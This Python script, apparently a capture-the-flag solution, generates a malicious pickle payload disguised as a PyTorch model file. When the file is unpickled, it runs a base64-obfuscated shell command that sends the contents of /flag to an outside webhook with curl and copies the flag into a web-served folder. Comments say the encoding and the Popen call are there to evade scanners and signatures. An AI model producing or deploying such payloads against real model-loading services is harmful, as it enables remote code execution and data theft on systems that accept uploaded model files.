import pickle
import sys
import subprocess
import base64

# CONFIGURATION
# =============
# Replace with your actual webhook URL!
# If you are running solve.py in parallel, you can find the URL in its output.
WEBHOOK_URL = "https://webhook.site/2836268e-59ee-4f9e-a0e7-8b02441c2a11" 

# BASE64 ENCODED COMMAND
# ======================
# The raw command we want to run:
# curl -X POST -d "$(cat /flag)" WEBHOOK_URL
raw_cmd = f"curl -X POST -d \"$(cat /flag)\" {WEBHOOK_URL}; cp /flag /app/static/flag.txt"

# Encode it to hide it from string-based scanners
b64_cmd = base64.b64encode(raw_cmd.encode()).decode()

# The command that will run on the server:
# echo <b64> | base64 -d | sh
loader_cmd = f"echo {b64_cmd} | base64 -d | sh"

print(f"[*] Raw Command: {raw_cmd}")
print(f"[*] Loader Command: {loader_cmd}")

class MaliciousModel(object):
    def __reduce__(self):
        # Use subprocess.Popen(['/bin/sh', '-c', '...'])
        # This differs from os.system("...") and might bypass signatures
        return (subprocess.Popen, (['/bin/sh', '-c', loader_cmd],))

if __name__ == "__main__":
    output_file = "nailong_payload_v2.pth"
    with open(output_file, 'wb') as f:
        pickle.dump(MaliciousModel(), f)
    print(f"[+] Generated {output_file}")
    print("[!] Upload this file to the server.")
